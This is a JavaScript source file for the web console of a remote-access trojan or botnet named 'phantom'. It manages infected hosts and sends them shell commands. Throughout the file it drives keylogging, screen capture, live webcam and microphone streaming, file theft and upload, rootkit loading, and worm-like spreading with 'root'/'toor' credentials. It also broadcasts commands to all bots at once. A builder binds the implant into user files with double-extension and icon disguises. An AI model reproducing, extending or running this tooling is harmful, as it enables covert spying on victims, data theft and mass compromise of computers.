const $ = (id) => document.getElementById(id);
const esc = (s) => String(s ?? '').replace(/[&<>]/g, (c) =>
  ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));

// optional ?token=<password> mode (no basic-auth dialog needed)
const TOKEN = new URLSearchParams(location.search).get('token') || '';
const _fetch = window.fetch.bind(window);
window.fetch = (u, o) => {
  if (TOKEN && typeof u === 'string' && u.startsWith('/')) {
    u += (u.includes('?') ? '&' : '?') + 'token=' + encodeURIComponent(TOKEN);
  }
  return _fetch(u, o);
};

let sessions = {}, selected = null, checked = new Set();
let filter = '', sortBy = 'name', media = {}, hist = {}, histIdx = {};
let cfg = {};

// ---------- websocket with auto-reconnect ----------
let ws, audio = null;

function connect() {
  ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws'
    + (TOKEN ? '?token=' + encodeURIComponent(TOKEN) : ''));
  ws.onopen = () => { $('status').textContent = 'connected'; $('status').classList.add('on'); };
  ws.onclose = () => {
    $('status').textContent = 'disconnected'; $('status').classList.remove('on');
    setTimeout(connect, 2000);
  };
  ws.onmessage = (e) => {
    const m = JSON.parse(e.data);
    if (m.type === 'snapshot') {
      m.sessions.forEach(s => sessions[s.id] = s);
      if (m.sessions.length && !selected) select(m.sessions[0].id);
      render();
    } else if (m.type === 'new_session') {
      sessions[m.session.id] = m.session; render();
      toast(`+ ${m.session.host.hostname || 'host'} joined`);
    } else if (m.type === 'drop') {
      delete sessions[m.session_id]; render();
    } else if (m.type === 'result') {
      const s = sessions[m.session_id];
      if (s) (s.history = s.history || []).push(m.result);
      if (m.session_id === selected) { printResult(m.result); captureError(m.result); }
    } else if (m.type === 'stream') {
      onStream(m);
    }
  };
}
connect();

// ---------- toasts ----------
function toast(t) {
  const d = document.createElement('div');
  d.className = 'toast'; d.textContent = t;
  $('toasts').appendChild(d); setTimeout(() => d.remove(), 4000);
}

// ---------- sidebar ----------
function render() {
  let list = Object.values(sessions);
  if (filter) {
    const f = filter.toLowerCase();
    list = list.filter(s => [s.host.hostname, s.host.ip, s.host.user, s.host.os, (s.tags || []).join(' ')]
      .some(v => (v || '').toLowerCase().includes(f)));
  }
  list.sort((a, b) => {
    if (sortBy === 'ip') return (a.host.ip || '').localeCompare(b.host.ip || '');
    if (sortBy === 'seen') return (b.last_seen || 0) - (a.last_seen || 0);
    return (a.host.hostname || '').localeCompare(b.host.hostname || '');
  });
  $('count').textContent = Object.keys(sessions).length + ' bots';
  const ul = $('sessions'); ul.innerHTML = '';
  list.forEach(s => {
    const li = document.createElement('li');
    if (s.id === selected) li.classList.add('sel');
    li.innerHTML = `<input type="checkbox" ${checked.has(s.id) ? 'checked' : ''}>
      <span class="dot ${s.alive ? 'live' : ''}"></span>
      <div><div class="host">${esc(s.host.hostname || '?')}${s.host.elevated ? ' <span class="adm">admin</span>' : ''}</div>
      <div class="meta">${esc(s.host.user || '?')}@${esc(s.remote || s.host.ip || '?')} · ${esc(s.host.os || '')}</div>
      ${s.streams && s.streams.cam ? '<div class="meta live">● camera live</div>' : ''}
      ${s.tags && s.tags.length ? `<div class="meta">#${esc(s.tags.join(' #'))}</div>` : ''}</div>`;
    li.querySelector('input').onclick = (ev) => {
      ev.stopPropagation();
      ev.target.checked ? checked.add(s.id) : checked.delete(s.id);
    };
    li.onclick = () => select(s.id);
    ul.appendChild(li);
  });
}

function select(id) {
  selected = id;
  const s = sessions[id];
  if (!s) return;
  $('target').textContent =
    `${s.host.hostname} — ${s.host.user}@${s.remote || s.host.ip} (pid ${s.host.pid})`
    + (s.host.elevated ? ' [admin]' : '');
  $('term').textContent = '';
  (s.history || []).forEach(printResult);
  $('infoout').textContent = JSON.stringify(s.host, null, 2);
  $('i_sleep').value = s.sleep; $('i_jitter').value = s.jitter;
  $('i_note').value = s.note || ''; $('i_tags').value = (s.tags || []).join(', ');
  showCam(s.cam);
  renderMedia();
  render();
}

function log(t) {
  const d = document.createElement('div');
  d.className = 'meta'; d.textContent = t;
  $('term').appendChild(d); $('term').scrollTop = $('term').scrollHeight;
}

// surface implant-side failures (missing ffmpeg, etc.) as toasts
function captureError(r) {
  if (r && r.ok === false && r.err) toast('!' + r.err.slice(0, 120));
}

// ---------- result rendering ----------
function printResult(r) {
  const c = document.createElement('div');
  c.className = 'cmd';
  c.textContent = `\n$ ${(r.cmd_id || '').slice(0, 8)}`;
  $('term').appendChild(c);
  const o = document.createElement('div');
  o.className = r.ok ? '' : 'err';
  o.textContent = r.ok ? (r.out || '') : ('ERR: ' + r.err);
  $('term').appendChild(o); $('term').scrollTop = $('term').scrollHeight;
  if (!r.ok || !r.out) return;

  try {
    const arr = JSON.parse(r.out);
    if (Array.isArray(arr) && arr.length) {
      if (arr[0] && 'name' in arr[0]) { renderFiles(arr); return; }
      if (arr[0] && 'ip' in arr[0]) { renderScan(arr); return; }
    }
  } catch (_) {}

  if (r.out.length > 200 && /^[A-Za-z0-9+/=]+$/.test(r.out.slice(0, 80))) {
    if (r.out.startsWith('iVBOR')) addMedia(r, 'png');
    else if (r.out.startsWith('/9j')) addMedia(r, 'jpeg');
    else if (r.out.startsWith('UklGR') || r.out.startsWith('c2Ftc')) addMedia(r, 'wav');
  }
}

function renderFiles(arr) {
  const tb = $('ftable').querySelector('tbody'); tb.innerHTML = '';
  arr.forEach(f => {
    const tr = document.createElement('tr');
    tr.innerHTML = `<td class="name">${esc(f.name)}${f.dir ? '/' : ''}</td><td>${f.size}</td>
      <td>${f.dir ? '' : '<button class="mini">get</button>'}</td>`;
    tr.querySelector('.name').onclick = () => {
      $('fpath').value = f.name;
      sendCmd('lsjson', { path: f.name });
    };
    const dl = tr.querySelector('button');
    if (dl) dl.onclick = (e) => { e.stopPropagation(); sendCmd('download', { path: f.name }); };
    tb.appendChild(tr);
  });
}

function renderScan(hits) {
  const box = document.createElement('div');
  box.textContent = '\n' + hits.map(h => `${h.ip}  →  ${h.ports.join(', ')}`).join('\n');
  $('term').appendChild(box); $('term').scrollTop = $('term').scrollHeight;
}

function addMedia(r, ext) {
  const item = { ext, data: r.out, ts: Date.now(), id: r.cmd_id };
  (media[selected] = media[selected] || []).push(item);
  renderMedia();
}

function renderMedia() {
  const box = $('mediaout'); box.innerHTML = '';
  (media[selected] || []).forEach(m => {
    const fig = document.createElement('figure');
    if (m.ext === 'wav') {
      const a = document.createElement('audio'); a.controls = true;
      a.src = 'data:audio/wav;base64,' + m.data; fig.appendChild(a);
    } else {
      const img = document.createElement('img');
      img.src = 'data:image/' + m.ext + ';base64,' + m.data; fig.appendChild(img);
    }
    const cap = document.createElement('figcaption');
    cap.className = 'meta'; cap.textContent = new Date(m.ts).toLocaleTimeString();
    fig.appendChild(cap);
    fig.onclick = () => fig.remove();
    box.prepend(fig);
  });
}

// ---------- live camera ----------
function showCam(b64) {
  if (b64) $('camview').src = 'data:image/jpeg;base64,' + b64;
}

function onStream(m) {
  if (m.kind === 'cam') {
    if (m.session_id === selected) {
      showCam(m.b64);
      $('camstat').textContent = `frame ${m.seq} · ${Math.round(m.b64.length * 0.75 / 1024)} KB`;
    }
    const s = sessions[m.session_id];
    if (s) { s.cam = m.b64; s.streams = s.streams || {}; s.streams.cam = true; }
  } else if (m.kind === 'mic') {
    const s = sessions[m.session_id];
    if (s) { s.streams = s.streams || {}; s.streams.mic = true; }
    if (m.session_id === selected) { $('micstat').textContent = `chunk ${m.seq}`; playMic(m.b64); }
  }
}

// ---------- live microphone (web audio) ----------
let micNext = 0;

async function playMic(b64) {
  const tab = $('mic_on');
  if (!tab.classList.contains('on')) return;
  if (!audio) {
    const Ctx = window.AudioContext || window.webkitAudioContext;
    if (!Ctx) return;
    audio = new Ctx();
    micNext = audio.currentTime;
  }
  if (audio.state === 'suspended') await audio.resume();

  const bin = atob(b64);
  const buf = new Int16Array(bin.length / 2);
  for (let i = 0; i < buf.length; i++) {
    buf[i] = (bin.charCodeAt(i * 2) | (bin.charCodeAt(i * 2 + 1) << 8)) << 16 >> 16;
  }
  const ab = audio.createBuffer(1, buf.length, 16000);
  const ch = ab.getChannelData(0);
  for (let i = 0; i < buf.length; i++) ch[i] = buf[i] / 32768;

  const src = audio.createBufferSource();
  src.buffer = ab; src.connect(audio.destination);
  const now = audio.currentTime;
  if (micNext < now || micNext > now + 1.5) micNext = now + 0.05;
  src.start(micNext);
  micNext += ab.duration;

  drawWave(ch);
}

function drawWave(ch) {
  const cv = $('micwave');
  if (!cv) return;
  cv.width = cv.clientWidth || 300;
  const ctx = cv.getContext('2d');
  ctx.clearRect(0, 0, cv.width, cv.height);
  ctx.strokeStyle = '#58e0b0';
  ctx.beginPath();
  const step = Math.max(1, Math.floor(ch.length / cv.width));
  for (let x = 0; x < cv.width; x++) {
    const v = ch[x * step] || 0;
    const y = cv.height / 2 - v * cv.height * 0.45;
    x ? ctx.lineTo(x, y) : ctx.moveTo(x, y);
  }
  ctx.stroke();
}

// ---------- tabs ----------
document.querySelectorAll('nav button').forEach(b => b.onclick = () => {
  document.querySelectorAll('nav button').forEach(x => x.classList.remove('on'));
  b.classList.add('on');
  document.querySelectorAll('main.tab').forEach(m => m.classList.remove('on'));
  $(b.dataset.tab).classList.add('on');
  if (b.dataset.tab === 'build') loadConfig();
});
document.querySelectorAll('.subtabs button').forEach(b => b.onclick = () => {
  document.querySelectorAll('.subtabs button').forEach(x => x.classList.remove('on'));
  b.classList.add('on');
  document.querySelectorAll('.subtab').forEach(m => m.classList.remove('on'));
  $(b.dataset.st).classList.add('on');
});


// ---------- command plumbing ----------
function buildArgs(type, val) {
  if (type === 'shell') return { cmd: val };
  if (type === 'ls' || type === 'lsjson') return { path: val || '.' };
  if (type === 'cat' || type === 'download') return { path: val };
  if (type === 'rootkit') return { ko: '/tmp/phantom_rootkit.ko', port: String(cfg.port || 443) };
  if (type === 'keylog') return { sub: val || 'dump' };
  if (type === 'scan') return { subnet: '', ports: '22,80,443' };
  if (type === 'spread') return { user: 'root', pass: 'toor', targets: '' };
  if (type === 'cam_stream') return { fps: 2, width: 640 };
  if (type === 'mic_stream') return {};
  return {};
}

function sendCmd(type, args) {
  if (!selected) return;
  fetch(`/api/session/${selected}/command`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ type, args })
  });
  log(`> [${type}] ${JSON.stringify(args)}`);
}

$('cmdform').onsubmit = (e) => {
  e.preventDefault(); if (!selected) return;
  const type = $('type').value, val = $('cmd').value.trim();
  (hist[selected] = hist[selected] || []).push(val);
  histIdx[selected] = hist[selected].length;
  sendCmd(type, buildArgs(type, val)); $('cmd').value = '';
};

$('cmd').onkeydown = (e) => {
  const h = hist[selected] || [];
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    histIdx[selected] = Math.max(0, (histIdx[selected] ?? h.length) - 1);
    $('cmd').value = h[histIdx[selected]] || '';
  }
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    histIdx[selected] = Math.min(h.length, (histIdx[selected] ?? 0) + 1);
    $('cmd').value = h[histIdx[selected]] || '';
  }
};

$('clear').onclick = () => { $('term').textContent = ''; };
$('medclear').onclick = () => { media[selected] = []; renderMedia(); };

document.querySelectorAll('#quick button').forEach(b => b.onclick = () => {
  const q = b.dataset.q;
  if (q === 'whoami') sendCmd('shell', { cmd: 'whoami' });
  else if (q === 'ls') sendCmd('lsjson', { path: '.' });
  else if (q === 'keylog start') sendCmd('keylog', { sub: 'start' });
  else if (q === 'cam') camStart();
  else if (q === 'mic') micStart();
  else sendCmd(q, buildArgs(q, ''));
});

$('bgo').onclick = async () => {
  const type = $('btype').value, val = $('bcmd').value.trim();
  const ids = checked.size ? [...checked] : Object.keys(sessions);
  const r = await fetch('/api/broadcast', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ session_ids: ids, type, args: buildArgs(type, val) })
  });
  const j = await r.json();
  $('bstatus').textContent = `queued on ${j.issued}`;
  setTimeout(() => $('bstatus').textContent = '', 2500);
};

$('selectall').onclick = (e) => {
  checked.clear();
  if (e.target.checked) Object.keys(sessions).forEach(id => checked.add(id));
  render();
};
$('search').oninput = (e) => { filter = e.target.value; render(); };
$('sort').onchange = (e) => { sortBy = e.target.value; render(); };

$('export').onclick = () => {
  const blob = new Blob([JSON.stringify(sessions, null, 2)], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob); a.download = 'phantom_sessions.json'; a.click();
};

// ---------- media buttons ----------
function camStart() {
  if (!selected) return;
  sendCmd('cam_stream', { fps: +$('cam_fps').value || 2, width: 640 });
  $('camstat').textContent = 'starting…';
  document.querySelector('[data-st="media"]').click();
}
function camStop() {
  if (!selected) return;
  sendCmd('cam_stream', { sub: 'stop' });
  $('camstat').textContent = 'stopped';
}
function micStart() {
  if (!selected) return;
  $('mic_on').classList.add('on');
  $('micstat').textContent = 'listening…';
  sendCmd('mic_stream', {});
  document.querySelector('[data-st="media"]').click();
}
function micStop() {
  $('mic_on').classList.remove('on');
  if (selected) sendCmd('mic_stream', { sub: 'stop' });
  $('micstat').textContent = 'muted';
}

$('cam_on').onclick = camStart;
$('cam_off').onclick = camStop;
$('mic_on').onclick = micStart;
$('mic_off').onclick = () => { micStop(); };
$('shot').onclick = () => sendCmd('screenshot', {});
$('snap').onclick = () => sendCmd('webcam', {});
$('recwav').onclick = () => sendCmd('mic', { secs: 5 });


// ---------- files ----------
$('flist').onclick = () => sendCmd('lsjson', { path: $('fpath').value || '.' });
$('fup').onclick = async () => {
  const f = $('fupload').files[0]; if (!f || !selected) return;
  const b64 = await new Promise(res => {
    const fr = new FileReader();
    fr.onload = () => res(fr.result.split(',')[1]);
    fr.readAsDataURL(f);
  });
  sendCmd('upload', { path: ($('fpath').value || '.') + '/' + f.name, b64 });
};

// collect downloads
const _pr = printResult;
printResult = function (r) {
  _pr(r);
  if (r.ok && r.out && r.out.length > 100 && /^[A-Za-z0-9+/=]+$/.test(r.out.slice(0, 40))) {
    try { JSON.parse(r.out); return; } catch (_) {}
    if (r.out.startsWith('iVBOR') || r.out.startsWith('/9j') || r.out.startsWith('UklGR')) return;
    const a = document.createElement('a');
    a.textContent = (r.cmd_id || '').slice(0, 8) + '.bin';
    a.href = 'data:application/octet-stream;base64,' + r.out;
    a.download = (r.cmd_id || 'file') + '.bin';
    $('dllist').prepend(a);
  }
};

// keylog pane
$('klstart').onclick = () => sendCmd('keylog', { sub: 'start' });
$('klstop').onclick = () => sendCmd('keylog', { sub: 'stop' });
$('kldump').onclick = () => sendCmd('keylog', { sub: 'dump' });
$('klclear').onclick = () => sendCmd('keylog', { sub: 'dump', clear: 'true' });
const _pr2 = printResult;
printResult = function (r) {
  _pr2(r);
  if (r.ok && r.out && $('keylog').classList.contains('on')) {
    $('klout').textContent += r.out;
  }
};

// ---------- info pane ----------
$('i_set').onclick = async () => {
  if (!selected) return;
  await fetch(`/api/session/${selected}/sleep`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ sleep: +$('i_sleep').value, jitter: +$('i_jitter').value })
  });
  toast('sleep updated');
};
$('i_save').onclick = async () => {
  if (!selected) return;
  await fetch(`/api/session/${selected}`, {
    method: 'PATCH', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      note: $('i_note').value,
      tags: $('i_tags').value.split(',').map(t => t.trim()).filter(Boolean)
    })
  });
  toast('saved');
};


// ---------- builder ----------
async function loadConfig() {
  try {
    const r = await fetch('/api/config');
    if (!r.ok) return;
    cfg = await r.json();
  } catch (_) { return; }
  $('b_url').value = cfg.public_url || '';
  $('b_urlhint').textContent = cfg.tls
    ? 'auto-detected secure endpoint'
    : 'plain http on the wire — put the app behind TLS (Coolify does this)';
  if (cfg.psk_hint) $('b_name').title = 'psk ' + cfg.psk_hint;
}

$('b_autourl').onclick = async () => {
  await loadConfig();
  toast('callback url refreshed');
};

let pickedFile = null;

function pickFile(f) {
  pickedFile = f || null;
  $('dropmsg').innerHTML = f
    ? `<strong>${esc(f.name)}</strong><br><span class="meta">${(f.size / 1024).toFixed(1)} KB — ready to bind</span>`
    : 'drop a file here or click to choose';
  $('drop').classList.toggle('filled', !!f);
  if (f && !$('b_name').value) $('b_name').value = f.name.replace(/\.[^.]+$/, '');
}

$('drop').onclick = () => $('b_file').click();
$('b_file').onchange = (e) => pickFile(e.target.files[0]);
['dragenter', 'dragover'].forEach(ev => $('drop').addEventListener(ev, (e) => {
  e.preventDefault(); $('drop').classList.add('over');
}));
['dragleave', 'drop'].forEach(ev => $('drop').addEventListener(ev, (e) => {
  e.preventDefault(); $('drop').classList.remove('over');
}));
$('drop').addEventListener('drop', (e) => {
  if (e.dataTransfer.files[0]) pickFile(e.dataTransfer.files[0]);
});

function commonForm() {
  const fd = new FormData();
  fd.append('name', $('b_name').value);
  fd.append('os', $('b_os').value);
  fd.append('arch', $('b_arch').value);
  fd.append('url', $('b_url').value.trim());
  fd.append('sleep', $('b_sleep').value);
  fd.append('jitter', $('b_jitter').value);
  fd.append('delay', $('b_delay').value);
  fd.append('console', $('b_console').checked ? '1' : '0');
  return fd;
}

$('b_build').onclick = async () => {
  if (!pickedFile) { toast('pick a file to bind first'); return; }
  $('b_msg').textContent = 'building…';
  const fd = commonForm();
  fd.append('file', pickedFile);
  fd.append('double_ext', $('b_double').checked ? '1' : '0');
  fd.append('icon', $('b_icon').checked ? '1' : '0');
  const r = await fetch('/api/bind', { method: 'POST', body: fd });
  if (!r.ok) { $('b_msg').textContent = 'ERROR: ' + await r.text(); return; }
  const j = await r.json();
  $('b_msg').textContent = `built ${j.binary} (${(j.size / 1048576).toFixed(1)} MB)`;
  toast('bound ' + j.binary);
  loadBuilds();
};

$('b_raw').onclick = async () => {
  $('b_msg').textContent = 'building…';
  const body = {
    name: $('b_name').value || 'phantom', os: $('b_os').value, arch: $('b_arch').value,
    url: $('b_url').value.trim() || undefined, sleep: +$('b_sleep').value,
    jitter: +$('b_jitter').value, delay: +$('b_delay').value,
    console: $('b_console').checked, fileless: $('b_fileless').checked
  };
  const r = await fetch('/api/build', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  if (!r.ok) { $('b_msg').textContent = 'ERROR: ' + await r.text(); return; }
  const j = await r.json();
  $('b_msg').textContent = 'built ' + j.binary;
  toast('built ' + j.binary);
  loadBuilds();
};


async function loadBuilds() {
  const r = await fetch('/api/builds');
  if (!r.ok) return;
  const j = await r.json();
  $('builds').innerHTML = '';
  j.forEach(b => {
    const li = document.createElement('li');
    li.innerHTML = `<a href="/api/builds/${encodeURIComponent(b.name)}" download>${esc(b.name)}</a>
      — ${(b.size / 1024).toFixed(1)} KB
      <button class="mini" data-del="${esc(b.name)}">del</button>`;
    li.querySelector('[data-del]').onclick = async () => {
      await fetch('/api/builds/' + encodeURIComponent(b.name), { method: 'DELETE' });
      loadBuilds();
    };
    $('builds').appendChild(li);
  });
}

loadBuilds();
loadConfig();

